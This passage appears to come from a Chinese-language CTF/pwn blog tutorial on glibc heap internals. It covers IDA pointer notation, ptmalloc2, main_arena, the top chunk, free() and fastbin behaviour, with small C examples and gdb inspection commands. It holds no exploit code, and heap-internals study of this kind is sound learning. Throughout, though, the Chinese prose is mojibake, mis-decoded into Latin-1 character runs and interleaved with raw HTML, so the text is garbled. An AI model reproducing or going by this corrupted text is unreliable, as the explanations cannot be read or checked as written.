†ç©ºé—´ï¼ˆ<em>ç”¨æˆ·æ•°æ®åŒº</em>ï¼‰</strong>ï¼Œè¿™ä¸ªåœ¨æœ€å‰é¢çš„é‚£ä¸ªå›¾ç‰‡ä¹Ÿå·²ç»æ ‡å‡ºæ¥äº†ã€‚<br>æœ‰æ—¶å€™é¢˜ç›®æ˜¯ä»¥æ›´å¤æ‚çš„æƒ…å†µï¼Œç”¨æŒ‡é’ˆæ¥è¡¨ç¤ºæŸä¸ªæ•°æ®ç»“æ„çš„ï¼Œä¾‹å¦‚ä¸‹é¢çš„è¿™ä¸ªå›¾ä¸­çš„ä¾‹å­ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226190505.png" alt="Pasted image 20250226190505"><br>first chunkï¼ˆsecond chunkï¼‰è¡¨ç¤ºç¬¬ä¸€å’Œç¬¬äºŒä¸ªç»“æ„ï¼Œ<strong>æ¯ä¸ªç»“æ„ä¸­éƒ½æœ‰ä¸€ä¸ª point_heap æŒ‡é’ˆæ¥æŒ‡å‘å­˜å‚¨ç”¨æˆ·æ•°æ®çš„å †å—ï¼ˆchunk)ã€‚</strong><br><strong>å·¦è¾¹çš„è¿™ä¸ªæœ¬èº«å°±æ˜¯ä¸€ä¸ªå †å—ï¼Œç”¨æ¥å­˜æ”¾ä¸€äº›å…¨å±€ä¿¡æ¯</strong>ã€‚æ¯”å¦‚ max_size å­˜å‚¨äº†èƒ½å¤Ÿå­˜å‚¨çš„æœ€å¤§ç»“æ„æ•°é‡ï¼›exist_num è¡¨ç¤ºå·²ç»å­˜å‚¨çš„ç»“æ„çš„æ•°é‡ã€‚</p><h3 id="IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼"><a href="#IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼" class="headerlink" title="IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼"></a>IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼</h3><p>åœ¨ IDA ä¼ªä»£ç ä¸­çš„æŒ‡é’ˆå½¢å¼å½¢å¦‚ä¸‹é¢çš„æƒ…å†µï¼š<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">*(qword_6020A8 + 8)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>è¡¨ç¤ºå–åˆ° qword_6020A8 è¿™ä¸ªåœ°å€åŠ  8 åç§»çš„é‚£ä¸ªåœ°å€å­˜å‚¨çš„å€¼</strong></p><p>æ±‡ç¼–ä»£ç ç­‰åŒäºï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000400F85                 mov     rax, cs:qword_6020A8.text:0000000000400F8C                 mov     rax, [rax+8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>ç®€å•è½¬åŒ–ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">*(addr) &#x3D; [addr]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h3><p>åœ¨ pwn çš„å †é¢˜ç›®ä¸­ï¼Œç»å¸¸ä¼šæœ‰åƒä¸€äº›â€ç¬”è®°ç®¡ç†ç³»ç»Ÿâ€ä¹‹ç±»çš„é¢˜ç›®ï¼Œä¾‹å¦‚ä¸‹é¢è¿™é‡Œä¾‹å­<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192122.png" alt="Pasted image 20250226192122"><br>ä»£ç æä¾›äº†æœ€åŸºæœ¬çš„å¢åˆ æŸ¥æ”¹çš„åŠŸèƒ½ã€‚è¿™ä¸ªâ€ç¬”è®°â€çš„æ•°æ®ç»“æ„<strong>é€šå¸¸å°±æ˜¯ä½¿ç”¨é“¾è¡¨è¿æ¥èµ·æ¥çš„</strong>ï¼Œè®°å½•äº†å½“å‰ note çš„å¤§å°ã€å±æ€§ã€å†…å®¹ç­‰ç­‰ã€‚<br><strong>ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯ä»¥æŒ‡é’ˆä¸ºåŸºç¡€æ¥å­˜å‚¨è¿™ä¸ª note ç»“æ„çš„</strong>ã€‚è¿™é‡Œçš„ i ä»£è¡¨ note çš„ç´¢å¼•ï¼Œè‹¥è¿™é‡Œçš„ i = 0 æ—¶ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192345.png" alt="Pasted image 20250226192345"><br><code>*(qword_6020A8 + 16)</code> å°±ä»£è¡¨ä» <code>qword_6020A8</code> è¿™ä¸ªåœ°å€å‡ºå†å¾€ååç§» 16 ä¸ªå­—èŠ‚ï¼Œå–åˆ°è¿™ä¸ªåœ°å€å­˜å‚¨çš„å€¼ï¼Œæ¥ç€æŠŠ 1 èµ‹å€¼ç»™è¿™ä¸ªåœ°æ–¹ï¼ˆä¹Ÿå°±æ˜¯æŠŠ 1 å­˜å…¥è¿™ä¸ªåœ°å€)<br>åŒæ ·çš„<code>*(qword_6020A8 + 24)</code> å°±ä»£è¡¨åç§» 24 ä¸ªå­—èŠ‚å¤„çš„å€¼ä¸º len<br>ä¾æ¬¡ç±»æ¨å°±å¯ä»¥åœ¨<strong>ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ä¸­</strong>ï¼ŒæŠŠæ•´ä¸ª note çš„æ•°æ®ç»“æ„å­˜å‚¨ä¸‹æ¥äº†ã€‚</p><h2 id="ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨"><a href="#ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨" class="headerlink" title="ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨"></a>ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨</h2><blockquote><p>å †ç®¡ç†å™¨ ptmalloc2 ä¸»è¦æ˜¯é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚</p></blockquote><p>ptmalloc2 çš„ä½œç”¨é€šä¿—çš„è®²å°±æ˜¯<strong>ç›¸å½“äºä¸€ä¸ªâ€ä¸­é—´å•†â€</strong>ï¼Œåœ¨ç¨‹åºæƒ³è¦ç”³è¯·å‘ç³»ç»Ÿç”³è¯·å †ç©ºé—´æ—¶ï¼Œè¿™é‡Œçš„ ptmalloc2 å°±ä¼šç”³è¯·ä¸€å—å¾ˆå¤§çš„ç©ºé—´ï¼Œå¹¶æ ¹æ®ç®—æ³•ä»è¿™äº›å†…å­˜ä¸­æŠŠç©ºé—´çœŸæ­£çš„åˆ†é…ç»™ç¨‹åºã€‚</p><p>ç®€å•ç‚¹è¯´å°±æ˜¯ä¸‹é¢è¿™ä¸ªå›¾ä¸­çš„æƒ…å†µï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192641.png" alt="Pasted image 20250226192641"></p><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt; #include &lt;malloc.h&gt; int main()&#123; char *p; p &#x3D; malloc(10); return 0; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ gdb ä¸­è¿›è¡Œè°ƒè¯•ï¼Œåœ¨ call malloc å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œ<strong>åœ¨è¿™é‡Œä½¿ç”¨ vmmap å‘½ä»¤ï¼ŒæŸ¥çœ‹å†…å­˜åˆ†å¸ƒ</strong>ã€‚å¯ä»¥çœ‹åˆ°æ­¤æ—¶å¹¶æ²¡æœ‰å‘ç°å †æ®µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193759.png" alt="Pasted image 20250226193759"><br>å•æ­¥ n ï¼Œvmmap å‘½ä»¤å†æ¬¡æŸ¥çœ‹å†…å­˜ï¼Œå‘ç°å‡ºç°äº†å †æ®µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193830.png" alt="Pasted image 20250226193830">**<br>åªç”³è¯·äº† 10 å­—èŠ‚çš„å¤§å°ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œçš„ä¸ºä»€ä¹ˆç»™äº†è¿™ä¹ˆå¤§çš„å †æ®µå‘¢ï¼Ÿ</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">0x00602000     ~    0x00623000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¡ç®—ä¸€ä¸‹ï¼Œåˆšå¥½æ˜¯ 132 kB<br><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">(0x00623000-0x00602000)&#x2F;1024 &#x3D; 132 kB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p><strong>è¿™132KBçš„å †ç©ºé—´å«åšarenaï¼Œæ­¤æ—¶å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥è¿™ä¸ªåŒºåŸŸå«åš main arena</strong></p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è¿™ 132 KB æ˜¯â€å‚å®¶â€ï¼ˆå†…æ ¸ï¼‰æ‰¹å‘ç»™â€ä¸­é—´å•†â€ï¼ˆptmalloc2ï¼‰çš„è´§ç‰©ï¼Œ<strong>ä»¥ä¾¿ä¸‹æ¬¡ç¨‹åºåœ¨å‘ç³»ç»Ÿç”³è¯·å°å†…å­˜çš„æ—¶å€™ï¼Œç›´æ¥å»â€ä¸­é—´å•†â€å»å–å°±è¡Œäº†</strong>ï¼Œä»–å°±ä¼šåœ¨è¿™ 132KB ä¸­æŒ‰ç…§è¦ç”³è¯·â€è´§ç‰©â€çš„å¤šå°‘è¿›è¡Œåˆ†é…ä¸‹å»ã€‚è‹¥â€ä¸­é—´å•†â€ç¼ºè´§äº†è¯ï¼Œptmalloc2 å°±ç»§ç»­å»æ‰¾â€å‚å®¶â€ï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰å»å–è´§</p><h3 id="æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ"><a href="#æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ" class="headerlink" title="æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ"></a>æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ</h3><p>åœ¨ä¸Šé¢æˆ‘ä»¬åŠ¨æ€è°ƒè¯•çš„æ—¶å€™å·²ç»æ‰§è¡Œäº† malloc å‡½æ•°ï¼Œç”³è¯·åˆ°çš„å †æŒ‡é’ˆæ˜¯ä¿å­˜åœ¨ eax ä¸­çš„<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193941.png" alt="Pasted image 20250226193941"><br>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹å†…å­˜å †å—æƒ…å†µï¼š</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">x&#x2F;32gx 0x602010-0x10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>32ä½çš„ç¨‹åºä½¿ç”¨ x/32xw æ¯”è¾ƒç›´è§‚ä¸€ç‚¹<br>è¿™é‡Œå‡å» 0x10 è¡¨ç¤ºä»å †å—çš„å¤´éƒ¨å¼€å§‹è§‚å¯Ÿï¼ˆåŒ…å« pre size å’Œ size å­—æ®µï¼‰<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194002.png" alt="Pasted image 20250226194002"><h2 id="å››ã€main-arenaä¸top-chunk"><a href="#å››ã€main-arenaä¸top-chunk" class="headerlink" title="å››ã€main_arenaä¸top chunk"></a>å››ã€main_arenaä¸top chunk</h2><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3>è¿™ä¸ª main_arena å…¶å®å°±æ˜¯ ptmalloc2 å †ç®¡ç†å™¨é€šè¿‡ä¸æ“ä½œç³»ç»Ÿå†…æ ¸è¿›è¡Œäº¤äº’ç”³è¯·åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºä¸Šé¢æ‰€è¯´çš„â€æ‰¹å‘â€åˆ°çš„ä¸€å †è´§ç‰©<blockquote><p>å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥å«åšmain arenaï¼Œé€šè¿‡å¢åŠ  program break location çš„æ–¹å¼æ¥å¢åŠ  main arena çš„å¤§å°ã€‚</p></blockquote></li></ul><p>åœ¨ gdb è°ƒè¯•ä¸­ï¼Œä½¿ç”¨<br>ä½¿ç”¨<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x&#x2F;32gx &amp;main_arena<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>å¯ä»¥çœ‹åˆ° main_arena çš„å†…å­˜åˆ†é…æƒ…å†µã€‚</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>é¡¾åæ€ä¹‰ï¼Œæ˜¯å †ä¸­ç¬¬ä¸€ä¸ªå †å—ã€‚ç›¸å½“äºä¸€ä¸ªâ€å¸¦å¤´å¤§å“¥â€ï¼Œç¨‹åºä»¥ååˆ†é…åˆ°çš„å†…å­˜åˆ°è¦æ”¾åœ¨ä»–çš„åé¢ã€‚</p><blockquote><p>åœ¨ç³»ç»Ÿå½“å‰çš„æ‰€æœ‰ free chunk(æ— è®ºé‚£ç§ bin)ï¼Œéƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤ chunk å½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</p></blockquote><p>ç®€å•ç‚¹è¯´ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¨‹åºåœ¨å‘å †ç®¡ç†å™¨ç”³è¯·å†…å­˜æ—¶ï¼Œ<strong>æ²¡æœ‰åˆé€‚çš„å†…å­˜ç©ºé—´å¯ä»¥åˆ†é…ç»™ä»–ï¼Œæ­¤æ—¶å°±ä¼šä» top chunk ä¸Šâ€å‰ªåˆ‡â€ä¸€éƒ¨åˆ†ä½œä¸º chunk åˆ†é…ç»™ä»–</strong></p><h2 id="äº”ã€freeå‡½æ•°å’Œbins"><a href="#äº”ã€freeå‡½æ•°å’Œbins" class="headerlink" title="äº”ã€freeå‡½æ•°å’Œbins"></a>äº”ã€freeå‡½æ•°å’Œbins</h2><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free å‡½æ•°çš„ä½¿ç”¨æ˜¯å’Œ bins çš„åˆ†é…æ¯æ¯ç›¸å…³çš„ã€‚ç”¨ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç†è§£ä¸€ä¸‹ free å‡½æ•°çš„å®ç°åŸç†ã€‚<br>ä»£ç å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;        char *p;        p &#x3D; malloc(10);        memcpy(p,&quot;Hello&quot;,5);        free(p);        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><ul><li>ç¨‹åºå°† â€œHelloâ€ å­—ç¬¦ä¸²å¤åˆ¶åˆ°ç”³è¯·åˆ°çš„å †å†…å­˜ç©ºé—´ä¸­ã€‚<br>ç¼–è¯‘åç”¨ gdb è°ƒè¯•ï¼Œåœ¨ call memcpy å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå•æ­¥åå°† â€œHelloâ€ å¤åˆ¶åˆ°å †å—ä¸­<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194730.png" alt="Pasted image 20250226194730"><br>ç»§ç»­ä½¿ç”¨ x/32gx 0x602010-0x10 å‘½ä»¤æŸ¥çœ‹å †å—æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194742.png" alt="Pasted image 20250226194742"><br>ç»§ç»­å•æ­¥ nï¼Œæ‰§è¡Œ free å‡½æ•°ä¹‹åï¼ŒæŸ¥çœ‹å †å—æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194753.png" alt="Pasted image 20250226194753"><br>è¿™é‡Œå¯ä»¥çœ‹å‡ºåŸæœ¬å †å—ä¸­å­˜å‚¨çš„å†…å®¹å·²ç»è¢«æ¸…ç©ºï¼Œç„¶å<strong>æŸ¥çœ‹ä¸€ä¸‹ main_arena çš„å€¼ï¼Œå‘ç°å…¶ä¸­ +0x8 çš„åç§»å¤„</strong>ï¼Œå­˜å‚¨äº†æŒ‡å‘å·²ç» free äº†çš„æŒ‡é’ˆï¼ˆæŒ‡å‘å¤´éƒ¨ï¼Œè€Œä¸æ˜¯ user data)</li></ul><p>æ‰€ä»¥è°ƒç”¨ free å‡½æ•°ä»¥åç¨‹åºåšäº†ä¸¤ä»¶äº‹ï¼š<br><strong>1.æ¸…ç©ºæ­¤å †å—çš„ user data<br>2.å°†æ­¤å †å—çš„æŒ‡é’ˆå­˜å‚¨åˆ° main_arena ä¸­äº†ï¼ˆæˆ–æ˜¯ fast bin ä¸­ï¼‰</strong></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bins è¿™ä¸ªæ¦‚å¿µæ˜¯ä¸å†…å­˜å›æ”¶ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯å †ç®¡ç†å™¨ä¼šæ ¹æ®ç”¨æˆ·å·²ç»ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´å¤§å°è¿›è¡Œé‡Šæ”¾ï¼Œ<strong>æ¥å†³å®šæ”¾å…¥å“ªç±» bins å½“ä½œå»</strong>ã€‚bins ç›´æ¥ç¿»è¯‘è¿‡æ¥å°±æ˜¯â€åƒåœ¾æ¡¶â€çš„æ„æ€ï¼Œæ‰€ä»¥åœ¨ç³»ç»Ÿåœ¨å†³å®šä½¿ç”¨å“ªä¸ª bins æ—¶å¯ä»¥çœ‹ä½œä¸ºâ€åƒåœ¾çš„åˆ†ç±»â€ã€‚<br>ä¸»è¦çš„ bins åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼Œè¿™é‡Œé‡ç‚¹è®²è§£ä¸€ä¸‹ fast binï¼Œå› ä¸º fast bin æ˜¯ä½¿ç”¨åˆ°çš„æœ€å¤šçš„ä¸€ç±»ï¼Œä¹Ÿæ˜¯å…¶ä¸­ç»“æ„æœ€ä¸ºç®€å•çš„ã€‚<br>æè¿°ï¼š</p><ol><li>ç”¨æˆ·freeæ‰çš„å†…å­˜å¹¶ä¸æ˜¯éƒ½ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œptmallocä¼šç»Ÿä¸€ç®¡ç†heapå’Œmmapæ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„chunk</li><li>å½“ç”¨æˆ·è¿›è¡Œä¸‹ä¸€æ¬¡åˆ†é…è¯·æ±‚æ—¶ï¼Œptmallocä¼šé¦–å…ˆè¯•å›¾åœ¨ç©ºé—²çš„chunkä¸­æŒ‘é€‰ä¸€å—ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±é¿å…äº†é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½äº†å†…å­˜åˆ†é…çš„å¼€é”€</li><li><strong>ptmallocå°†ç›¸ä¼¼å¤§å°çš„chunkç”¨åŒå‘é“¾è¡¨é“¾æ¥èµ·æ¥ï¼Œè¿™æ ·çš„ä¸€ä¸ªé“¾è¡¨è¢«ç§°ä¸ºä¸€ä¸ªbin</strong></li><li>ptmallocä¸€å…±ç»´æŠ¤äº†128ä¸ªbinï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨è¿™äº›bin</li><li>å †ç®¡ç†å™¨æ ¹æ®ç‰¹ç‚¹ï¼Œå°†å †åˆ†ä¸ºå››ç§ï¼š<strong>fastbin | unsortedbin | smallbin | largebin</strong></li><li>æ•°ç»„ä¸­<strong>bin 1ä¸ºunsorted binï¼›bin 2åˆ°63ä¸ºsmall binï¼›bin 64åˆ°126ä¸ºlarge bin</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226201008.png" alt="Pasted image 20250226201008"><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸ºäº†å¿«é€Ÿé‡æ–°åˆ†é…å›å†…å­˜è€Œå­˜åœ¨çš„ä¸€ä¸ªç»“æ„ã€‚<blockquote><p>fastbinæ‰€åŒ…å«chunkçš„å¤§å°ä¸º16 Bytes, 24 Bytes, 32 Bytes, â€¦ , 80 Bytesã€‚å½“åˆ†é…ä¸€å—è¾ƒå°çš„å†…å­˜(mem&lt;=64 Bytes)æ—¶ï¼Œ<strong>ä¼šé¦–å…ˆæ£€æŸ¥å¯¹åº”å¤§å°çš„fastbinä¸­æ˜¯å¦åŒ…å«æœªè¢«ä½¿ç”¨çš„chunkï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥å°†å…¶ä»fastbinä¸­ç§»é™¤å¹¶è¿”å›ï¼›å¦åˆ™é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå‰ªåˆ‡top chunkï¼‰å¾—åˆ°ä¸€å—ç¬¦åˆå¤§å°è¦æ±‚çš„chunkå¹¶è¿”å›</strong>ã€‚</p></blockquote></li></ol><p><strong>æè¿°ï¼š</strong></p><ol><li>åœ¨32ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·é‡Šæ”¾çš„å †å—å¤§å°å°äº64Bæ—¶ä½¿ç”¨fastbinè¿›è¡Œç®¡ç†ï¼Œå³chunkç©ºé—´æœ€å¤§ä¸º80å­—èŠ‚</li><li>fastbinåªä½¿ç”¨äº†fdæˆå‘˜ï¼Œæ˜¯ä¸ªå•é“¾è¡¨ç»“æ„</li><li>fastbinä¸ä¼šå¯¹Pä½è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸ä¼šä¸»åŠ¨è¿›è¡Œåˆå¹¶ï¼›åªæœ‰åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹ï¼Œå †ç®¡ç†å™¨æ‰ä¼šå¯¹fastbinè¿›è¡Œåˆå¹¶</li><li>fastbinYä¸ºç®¡ç†fastbinçš„æ•°ç»„ï¼Œæ¯ä¸ªæˆå‘˜åˆ†åˆ«ç®¡ç†ä¸åŒå¤§å°çš„fastbiné“¾è¡¨ï¼Œä¸”å‡æŒ‡å‘äº†å½“å‰é“¾è¡¨çš„å°¾èŠ‚ç‚¹ï¼Œå½“å°¾èŠ‚ç‚¹è¢«åˆ†é…æ—¶ï¼Œé€šè¿‡å…¶fdæŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªç»“ç‚¹</li><li>å½“ç”¨æˆ·ç”³è¯·chunkå¤§å°å°äºæˆ–ç­‰äºMAX_FAST_SIZEæ—¶ï¼Œä¼˜å…ˆä»fastbinsä¸­æŸ¥æ‰¾ç›¸åº”çš„ç©ºé—²å—ï¼Œä¸”è§„åˆ™ä¸ºLIFOï¼ˆLast in, first out, åè¿›å…ˆå‡ºï¼‰<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204112.png" alt="Pasted image 20250226204112"><br>ğŸ‘‡è¿™é‡Œçš„æ¨ªå‘æ’åˆ—çš„å°±æ˜¯ main_areneï¼ˆfast binï¼‰çš„å†…å­˜åœ°å€<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204137.png" alt="Pasted image 20250226204137"><br>å‡å¦‚æ­¤æ—¶ 0x0804a000 å¤„çš„å †å—ï¼ˆå®é™…å †å—ä¸­çš„ size å­—æ®µè¦å‡å» PREV_INUSE å­—æ®µå€¼ 1ï¼Œ)å·²ç»è¢« free äº†ï¼Œé‚£ä¹ˆä»–å°±ä¼šè¢«å­˜å‚¨<strong>åœ¨è¡¨ç¤º 40 bytes çš„ fast bin çš„å†…å­˜åœ°å€é‡Œ</strong></li></ol><ul><li>æ³¨æ„ï¼š<strong>è¿™é‡ŒæŠŠæŒ‡é’ˆå’Œåœ°å€åŒºåˆ«å¼€ã€‚åœ°å€å­˜å‚¨çš„æ˜¯æŒ‡é’ˆï¼Œ64 ä½çš„æŒ‡é’ˆå  8 ä¸ªå­—èŠ‚</strong>ã€‚<br><strong>å‡è®¾æˆ‘ä»¬ç°åœ¨è¿˜æ˜¯ä»¥ 64 ä½ä¸‹çš„ malloc(10) ä¸ºä¾‹å­ã€‚</strong><br>æ ¹æ®å‰é¢é‚£ä¸ª free å‡½æ•°çš„ä¾‹å­ï¼ŒæŸ¥çœ‹ main_arena åœ°å€ä¸­çš„æŒ‡é’ˆå€¼æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œ<strong>+0x8 åç§»å¤„æ‰æ˜¯æŒ‡å‘ malloc(10) çš„å †å—çš„æŒ‡é’ˆ</strong>ï¼ˆè¿™ä¸ªå †å—åˆ†é…åçš„ user data å®é™…å¤§å°æ˜¯ 16 å­—èŠ‚ï¼‰</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-peda$ x&#x2F;2gx &amp;main_arena                           (16 bytes çš„é“¾è¡¨å¤´)0x7ffff7dd3760 &lt;main_arena&gt;:    0x0000000000000000    0x0000000000602000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥è¿™ä¸ª 16 å­—èŠ‚çš„å †å—çš„æŒ‡é’ˆä¼šè¢«æ’å…¥å±äºä»–çš„è¿™ä¸ªé“¾è¡¨é˜Ÿåˆ—ä¸­ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹çš„æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204230.png" alt="Pasted image 20250226204230"><br>æ‰€ä»¥è¿™ä¹Ÿå°±<strong>å°è¯äº†åœ¨ main_arena ä¸­åˆ†åˆ«è¡¨ç¤º 16 Bytes, 24 Bytes, 32 Bytes, â€¦ , 80 Bytes çš„å†…å­˜åœ°å€ä¸­åˆ†åˆ«å­˜å‚¨ç€å·²ç» free çš„è€Œä¸”æ»¡è¶³è¿™ä¸ªå¤§å°çš„ chunkçš„æŒ‡é’ˆã€‚</strong></p><h5 id="fast-binçš„ç‰¹æ€§"><a href="#fast-binçš„ç‰¹æ€§" class="headerlink" title="fast binçš„ç‰¹æ€§"></a>fast binçš„ç‰¹æ€§</h5><p><strong>1.ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—</strong><br>ä¹Ÿå°±æ˜¯å’Œä¸Šå›¾ä¸€æ ·ï¼Œä»main_arena åˆ° free ç¬¬ä¸€ä¸ªå—çš„åœ°æ–¹æ˜¯é‡‡ç”¨å•é“¾è¡¨å½¢å¼è¿›è¡Œå­˜å‚¨çš„ï¼Œè‹¥è¿˜æœ‰ free æ‰çš„å †å—ï¼Œåˆ™è¿™ä¸ªå †å—çš„ fk æŒ‡é’ˆåŸŸå°±ä¼šæŒ‡é’ˆå‰ä¸€ä¸ªå †å—ã€‚<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶å°±æ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204508.png" alt="Pasted image 20250226204508"><br><strong>2.é‡‡ç”¨åè¿›å…ˆå‡ºçš„æ–¹å¼ç»´æŠ¤é“¾è¡¨ï¼ˆç±»ä¼¼äºæ ˆçš„ç»“æ„ï¼‰</strong><br>å½“ç¨‹åºéœ€è¦é‡æ–° malloc å†…å­˜å¹¶ä¸”éœ€è¦ä»fastbin ä¸­æŒ‘é€‰å †å—æ—¶ï¼Œ<strong>ä¼šé€‰æ‹©åé¢æ–°åŠ å…¥çš„å 